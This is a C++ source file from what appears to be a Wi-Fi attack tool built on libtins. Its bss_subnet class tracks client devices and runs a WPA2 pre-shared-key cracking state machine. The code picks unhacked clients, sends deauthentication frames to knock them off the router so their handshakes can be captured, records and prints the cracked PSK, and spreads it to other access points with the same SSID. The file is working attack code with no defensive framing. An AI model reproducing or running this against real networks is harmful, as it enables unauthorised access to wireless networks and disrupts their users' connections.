#include "bss.hpp"


bss_subnet::bss_subnet(std::shared_ptr <Print_devices> printer) {
    _printer = printer;
    _device_monitor = std::make_unique<Device_monitor>();
    _timestamp = std::chrono::system_clock::now();
}

bss_subnet::~bss_subnet() {

}

std::shared_ptr <Device> bss_subnet::get_device(Tins::HWAddress<6> mac) {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    return _device_monitor->get_device(mac);
}

std::shared_ptr <Device> bss_subnet::add_device(std::shared_ptr <Device> dev) {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    if (_router != nullptr)
        return _device_monitor->set_device(dev, _router);
    else
        return nullptr;
}

std::shared_ptr <Device> bss_subnet::get_router() {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    return _router;
}

std::shared_ptr <Device> bss_subnet::set_router(std::shared_ptr <Device> router_tmp) {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    _router = _device_monitor->set_router(router_tmp);
    _ssid = _router->get_name();
    return _router;
}

std::string bss_subnet::get_ssid() {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    return _ssid;
}

void bss_subnet::set_ssid(std::string ssid) {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    _ssid = ssid;
}

void bss_subnet::set_same_bss(std::shared_ptr <bss_subnet> bss_subnet) {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    _same_ssid_bss_subnets.push_back(bss_subnet);
}

std::list <std::shared_ptr<bss_subnet>> bss_subnet::get_bss_same_ssid_list() {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    return _same_ssid_bss_subnets;
}

bool bss_subnet::get_psk_hack_status() {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    return _psk_hack_in_progress;
}

void bss_subnet::set_psk_hack_status() {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    _psk_hack_in_progress = true;
}


std::string bss_subnet::get_psk() {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    return _psk;
}

void bss_subnet::set_psk(std::string psk) {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    _router->set_psk(psk);
    _psk = psk;
}

void bss_subnet::start_psk_hack() {
    if (_deauth_sender == nullptr) {
        _deauth_sender = std::make_unique<Send_DeAuth>();
        _deauth_sender->set_printer(_printer);
    }
    if (!_psk_hack_in_progress)
        _psk_hack_in_progress = true;
    _all_devices_vector = _device_monitor->get_all_devices();
    if (_host_hack == nullptr && !_all_devices_vector.empty()) {

        for (auto host : _all_devices_vector) {
            if (std::find(_hacked_devices_vector.begin(), _hacked_devices_vector.end(), host) ==
                _hacked_devices_vector.end()) {
                //Device is not hacked, hack it now!
                _host_hack = host;
            }
        }
    } else {
        if (_device_hack_counter == 4 && !_all_devices_vector.empty()) {
            for (auto host : _all_devices_vector) {
                if ((host == _host_hack))
                    continue;
                else if (std::find(_hacked_devices_vector.begin(), _hacked_devices_vector.end(), host) ==
                         _hacked_devices_vector.end()) {
                    //Device is not hacked, hack it now!
                    _host_hack = host;
                    break;
                }
            }
            _device_hack_counter = 0;
        } else {
            _device_hack_counter++;
        }
    }

    switch (get_wpa2_hack_status()) {
        case 0: {
            if (_host_hack == nullptr)
                return;
            if (_wait_for_jamm)
                return;
            else
                _wait_for_jamm = true;
            set_wpa2_hack_status(4);
            auto jamm = std::async(std::launch::async, [this]() {
                auto destination = _host_hack->get_addresses().hw_addr;
                auto router = _router->get_addresses().hw_addr;
                _deauth_sender->jamm_device(1, destination, router, _ssid, _iface);
                _wait_for_jamm = false;
            });

            break;
        }
            // First Step force to reconnect!
        case 1: {

            _psk_hack_in_progress = false;
            auto bal = _router->get_psk();
            //_router->set_psk(bal+ " " + _host_hack->get_addresses().hw_addr.to_string());
            _hacked_devices_vector.push_back(_host_hack);
            _host_hack = nullptr;
            //set_wpa2_hack_status(0);
            _printer->print_string("PSK: " + _psk);


            break;
        }
        case 2: {
            if (_host_hack == nullptr)
                return;
            auto now = std::chrono::system_clock::now();
            std::chrono::duration<double, std::milli> diff = now - _timestamp;

            if (diff.count() < 10000) {
                return;
            } else {

                _timestamp = std::chrono::system_clock::now();
            }
            auto jamm = std::async(std::launch::async, [this]() {
                auto destination = _host_hack->get_addresses().hw_addr;
                auto router = _router->get_addresses().hw_addr;
                _deauth_sender->jamm_device(1, destination, router, _ssid, _iface);
                _wait_for_jamm = false;
            });
            set_wpa2_hack_status(4);

            break;
        }
            //need whole handshake!
        case 3: {

            //_printer->print_string("CHANGE WORDLIST!");
            _psk_hack_in_progress = false;
            //Wrong Wordlist
            break;
        }
        case 4: {

            auto now = std::chrono::system_clock::now();
            std::chrono::duration<double, std::milli> diff = now - _timestamp;
            if (diff.count() < 10000) {
                return;
            } else {
                _timestamp = std::chrono::system_clock::now();
                set_wpa2_hack_status(0);
            }
            break;
        }
        default:
            _printer->print_string("Error in PSK Hack " + std::to_string(_wpa2_hack_status));
            break;
    }

}


void bss_subnet::set_wpa2_hack_status(int status) {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    _wpa2_hack_status = status;
}

int bss_subnet::get_wpa2_hack_status() {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    return _wpa2_hack_status;
}

void bss_subnet::spread_psk() {
    for (auto bss : _same_ssid_bss_subnets) {
        bss->set_psk(_psk);
    }
}

void bss_subnet::set_interface(Tins::NetworkInterface iface) {
    _iface = iface;
}


std::vector <std::shared_ptr<Device>> bss_subnet::get_hacked_devices() {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    return _hacked_devices_vector;
}

std::vector <std::shared_ptr<Device>> bss_subnet::get_devices() {
    std::unique_lock <std::mutex> lock(_bss_mutex);
    return _all_devices_vector;
}
